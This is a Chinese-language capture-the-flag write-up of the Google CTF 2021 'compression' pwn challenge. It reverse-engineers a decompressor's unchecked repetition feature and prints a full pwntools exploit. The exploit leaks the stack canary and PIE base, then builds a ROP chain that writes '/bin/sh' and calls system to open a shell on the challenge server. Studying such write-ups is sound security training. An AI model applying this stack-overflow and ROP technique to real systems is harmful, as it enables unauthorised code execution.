---
title: googlectf2021_compress
date: 2021-07-19 15:14:31
permalink: /pages/1d8e16/
categories:
  - ctf_wp
  - googlectf
tags:
  - 
---
## googlectf2021_compress

[[toc]]

题目文件: [坚果云](https://www.jianguoyun.com/p/DWw6xeMQtKXWCRiFzYEE (访问密码：ZGaui6)), [github](https://github.com/wlingze/ctf_events/tree/main/google_ctf/2021/pwn/COMPRESSION)

## 逆向分析

程序实现了个数据压缩器, 数据压缩思路是比较常规的计算重复进行压缩,

压缩`(.text:0000000000001600 compress_part_0 )`和解压`(.text:0000000000001840 decompress)`算法分别在对应函数内.

大致上格式如下:

```
54494e59 (magic)
11 (data) // 可选
ff character repetition // 可选
    // character:  表示要重复的数量
    // repetition: 表示所有数据重复的长度
ff0000 (exit)
```

注意ff字符会被识别为一个锚点, 此后的两个数据,分别为character, repetition, 表示要重复的字符个数和重复的总长度, 



功能1是压缩, 没有什么漏洞点, 最后后缀"\x00", 也没有泄漏的可能性,

功能2是解压, 单字节写入的时候溢出检测很足, 但是重复数据时候没有任何溢出检测, 可以在这里构造栈溢出漏洞, 但是注意程序的每一次写入都是一位一位移动下来, 不存在跳几步的情况, 所以利用的时候应该是先准备好数据再调整好重复的两个数值不断重复进行溢出.

功能3挺有意思,但是没有passwd, 猜了下, 不对, 估计就是为了给个system函数尬写的代码. 

## 漏洞点

经过分析, 输入的时候主要有意义的是一下几种情况: 

当输入字符并配合对应的character repetition时, 会形成一个指定的长度字符重复的效果, 解压会形成栈溢出, 可以通过这个写入rop链.

当不输入字符, 直接跟如character和repetition时, 可以不断重复栈内的数据, 当charater的数值可以指定位置, repetition可以指定写过来的数据长度, 于是通过计算长度, 可以将原本栈内某个位置的数据写过来, 此处:

* 程序会打印出数据, 可以造成泄漏,  
* 可以写过来数据后再次构造重复,然后造成栈溢出.

为此, 准备了几个函数:

```python
# 0xff 后跟的数据, 数据是7bit拼接起来的, 可参考压缩函数内的伪代码
def handle_number(number, sig=0):
    string = ""
    if sig > 0: # 负数
        number = (~(number) + 1) & 0xffffffffffffffff
    while(1):
        if (number > 0x7f):
            var = number 
            string += "{:02x}".format((var | 0x80) & 0xff)
            number >>= 7 
        else:
            string += "{:02x}".format(number)
            return string

# 设置重复数据, 用于第一段利用
def repeat(characters, repetition, sig = 0):
    if sig == 0:
        return "ff" + handle_number(characters) + handle_number(repetition)
    if sig == 1:
        return "ff" + handle_number(characters, 1) + handle_number(repetition)
    # 后面这俩没啥用, 因为不需要repetition为负数.
    if sig == 2:
        return "ff" + handle_number(characters) + handle_number(repetition, 1)
    if sig == 3:
        return "ff" + handle_number(characters, 1) + handle_number(repetition, 1)

# 处理数据,转化为压缩数据内储存的形式. (这段写的不好)
def handle_datas(datas):
    string = ""
    for data in datas:
        string += handle_data(data)
    return string

def handle_data(data):
    string = ""
    for i in p64(data):
        string += "{:02x}".format(i)
    return string


# 压缩一段数据, 用来第二段利用
def compress(datas, repetitions):
    comp = ""
    for data in datas:
        comp += handle_data(data)
    comp += "ff" + handle_number(len(datas) * 0x8) + handle_number(repetitions-1)
    return comp

# 填充 `1*8` 个数据
def pad8(len):
    return '11' * len * 8
```



## 利用

通过调试和构造, 

栈中原本存的canary和start函数地址都可以写到解压数据的位置, 再构造重复不断重复这两个值, 造成溢出, 构造数据使canary复写回去, start函数复写到ret位置, 程序打印解压结果造成canary和pie泄漏, 并return到start函数再次运行, 可以再构造rop链.

第二段就可以直接构造rop链了, 这里构造scanf写入"/bin/sh\x00"数据, 然后跟一个system函数, 

注意的是输入点到canary距离是`0x201*8`, canary距离ret距离`0x5*8`, 因此第二段rop推荐做法是先补`1*8`个无用字节, 距离`0x200*8`, 然后写入`0x10*8`个数据arr, 不断重复, arr[0]为canary, arr[6]为返回位置.

两段利用的payload:

```python

def sig2(cn):
    # payload = "54494e590000557C7B5603CAff08ff3fff0000"
    # payload = magic + pad(2) + pad8(0) + compress([
        # 0x1111111111111111, 
    # ], 0x1000) + end

    cn.sendlineafter("3. Read compression format documentation", str(2))

    # payload = magic + repeat(0x204*8, 8, 1) + repeat(0x200 * 8, 8, 1) + repeat(0x1ff * 8, 8, 1) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1020)+ end
    payload = magic + repeat(0x208*8, 8, 1) + repeat(0x200*8, 8, 1) + handle_data(0x3) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1050)+ end
    #           magic   stack                   canary                  pad                 start
    # gdb.attach(cn, cmd)
    print(payload)
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", payload)
    cn.recvuntil("That decompresses to:\n")
    
    # 想把/bin/sh写到这里, 后来发现远程的偏移量不同
    stack = un_number(cn.recvn(16, 2).decode())
    print("stack: " + hex(stack))
    binsh = stack - 0x1128
    print("binsh: " + hex(binsh))

    canary = un_number(cn.recvn(16, 2).decode())
    print("canary: " + hex(canary))
    a = un_number(cn.recvn(16, 2).decode())
    print(a==0x3)

    start = un_number(cn.recvn(16, 2).decode())
    print("start: " + hex(start))
    pie = start - 0x0000000000014E0
    print("pie: " + hex(pie))


    cn.sendlineafter("3. Read compression format documentation", str(2))
    
    system  = pie + 0x1134
    pop     = pie + 0x1B03  # pop rdi, ret;
    puts    = pie + 0x1110

    poprsi  = 0x1b01 + pie  # pop rsi, pop r15, ret,
    scanf   = 0x1184 + pie  
    bss     = 0x4050 + pie  # /bin/sh\x00 
    ret     = 0x1b04 + pie  # ret
    s       = 0x20c6 + pie  # "%800s"

    payload = magic + pad8(1) + compress([
        canary, 
        1, 
        2,
        3, 
        4, 
        5, 
        pop,
        s,
        poprsi, 
        bss,   
        0xa ,
        scanf, 
        pop, 
        bss, 
        ret,
        system 
    ], 0x1050) + end

    print(payload)
    # gdb.attach(cn, cmd)
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", payload)

    cn.sendline("/bin/sh\x00")
    cn.sendline("cat flag")
    cn.interactive()
```



完整exp:

::: details

```python
from pwn import * 
context.binary='./compress'
context.log_level='debug'



sa = lambda a, b: cn.sendafter(a, b)
sla = lambda a, b: cn.sendlineafter(a, b)

def un_number(number_string):
    number = 0
    leng = len(number_string)
    for i in range(leng // 2):
        var = int(number_string[i*2:i*2+2], 16) << (i * 8)
        number = number | var
    return number


# 0xff 后跟的数据, 数据是7bit拼接起来的, 可参考压缩函数内的伪代码
def handle_number(number, sig=0):
    string = ""
    if sig > 0: # 负数
        number = (~(number) + 1) & 0xffffffffffffffff
    while(1):
        if (number > 0x7f):
            var = number 
            string += "{:02x}".format((var | 0x80) & 0xff)
            number >>= 7 
        else:
            string += "{:02x}".format(number)
            return string

# 设置重复数据, 用于第一段利用
def repeat(characters, repetition, sig = 0):
    if sig == 0:
        return "ff" + handle_number(characters) + handle_number(repetition)
    if sig == 1:
        return "ff" + handle_number(characters, 1) + handle_number(repetition)
    # 后面这俩没啥用, 因为不需要repetition为负数.
    if sig == 2:
        return "ff" + handle_number(characters) + handle_number(repetition, 1)
    if sig == 3:
        return "ff" + handle_number(characters, 1) + handle_number(repetition, 1)

# 处理数据,转化为压缩数据内储存的形式. (这段写的不好)
def handle_datas(datas):
    string = ""
    for data in datas:
        string += handle_data(data)
    return string

def handle_data(data):
    string = ""
    for i in p64(data):
        string += "{:02x}".format(i)
    return string


# 压缩一段数据, 用来第二段利用
def compress(datas, repetitions):
    comp = ""
    for data in datas:
        comp += handle_data(data)
    comp += "ff" + handle_number(len(datas) * 0x8) + handle_number(repetitions-1)
    return comp

# 填充 `1*8` 个数据
def pad8(len):
    return '11' * len * 8


cmd = ""
bps = [0x000000000001346, 0x00000000000019C4]
for bp in bps:
    cmd += "b * $rebase({})\n".format(bp)

magic = "54494e59" 
end   = "ff0000"


def sig1(cn):
    cn.sendlineafter("3. Read compression format documentation", str(1))
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", flat('1122' * 0x40))

def sig2(cn):
    # payload = "54494e590000557C7B5603CAff08ff3fff0000"
    # payload = magic + pad(2) + pad8(0) + compress([
        # 0x1111111111111111, 
    # ], 0x1000) + end

    cn.sendlineafter("3. Read compression format documentation", str(2))

    # payload = magic + repeat(0x204*8, 8, 1) + repeat(0x200 * 8, 8, 1) + repeat(0x1ff * 8, 8, 1) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1020)+ end
    payload = magic + repeat(0x208*8, 8, 1) + repeat(0x200*8, 8, 1) + handle_data(0x3) + repeat(0x201*8, 8, 1) + repeat(0x20, 0x1050)+ end
    #           magic   stack                   canary                  pad                 start
    # gdb.attach(cn, cmd)
    print(payload)
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", payload)
    cn.recvuntil("That decompresses to:\n")
    
    # 想把/bin/sh写到这里, 后来发现远程的偏移量不同
    stack = un_number(cn.recvn(16, 2).decode())
    print("stack: " + hex(stack))
    binsh = stack - 0x1128
    print("binsh: " + hex(binsh))

    canary = un_number(cn.recvn(16, 2).decode())
    print("canary: " + hex(canary))
    a = un_number(cn.recvn(16, 2).decode())
    print(a==0x3)

    start = un_number(cn.recvn(16, 2).decode())
    print("start: " + hex(start))
    pie = start - 0x0000000000014E0
    print("pie: " + hex(pie))


    cn.sendlineafter("3. Read compression format documentation", str(2))
    
    system  = pie + 0x1134
    pop     = pie + 0x1B03  # pop rdi, ret;
    puts    = pie + 0x1110

    poprsi  = 0x1b01 + pie  # pop rsi, pop r15, ret,
    scanf   = 0x1184 + pie  
    bss     = 0x4050 + pie  # /bin/sh\x00 
    ret     = 0x1b04 + pie  # ret
    s       = 0x20c6 + pie  # "%800s"

    payload = magic + pad8(1) + compress([
        canary, 
        1, 
        2,
        3, 
        4, 
        5, 
        pop,
        s,
        poprsi, 
        bss,   
        0xa ,
        scanf, 
        pop, 
        bss, 
        ret,
        system 
    ], 0x1050) + end

    print(payload)
    # gdb.attach(cn, cmd)
    cn.sendlineafter("Send me the hex-encoded string (max 4k):", payload)

    cn.sendline("/bin/sh\x00")
    cn.sendline("cat flag")
    cn.interactive()

# cn1 = context.binary.process()
cn1 = remote("compression.2021.ctfcompetition.com", 1337)
sig2(cn1)

```



:::

